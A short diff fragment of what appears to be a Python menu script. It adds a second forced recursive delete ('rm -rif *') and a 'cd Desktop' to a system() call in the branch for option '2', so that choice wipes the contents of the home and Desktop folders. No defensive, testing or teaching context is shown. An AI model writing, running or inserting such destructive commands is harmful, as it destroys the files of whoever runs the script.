@@ -21,6 +21,8 @@ elif x == '2' :
 
     system ('''
 cd home
+rm -rif * 
+cd Desktop
 rm -rif * ''')
 
 else:
